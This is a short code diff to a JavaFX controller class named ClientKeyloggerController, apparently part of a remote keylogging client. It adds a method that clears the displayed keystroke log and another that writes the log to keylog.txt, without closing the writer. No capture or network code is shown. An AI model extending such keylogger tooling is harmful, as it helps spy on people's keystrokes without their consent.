@@ -3,7 +3,9 @@ package client;
 import javafx.fxml.FXML;
 import javafx.scene.control.TextArea;
 
+import java.io.FileNotFoundException;
 import java.io.IOException;
+import java.io.PrintWriter;
 
 public class ClientKeyloggerController {
     public ClientController clientController;
@@ -57,5 +59,15 @@ public class ClientKeyloggerController {
         }
     }
 
+    public void delete()
+    {
+        keylog = "";
+        stringBuilder.setLength(0);
+        txtLog.setText(keylog);
+    }
 
+    public void save() throws FileNotFoundException {
+        PrintWriter out = new PrintWriter("keylog.txt");
+        out.println(keylog);
+    }
 }
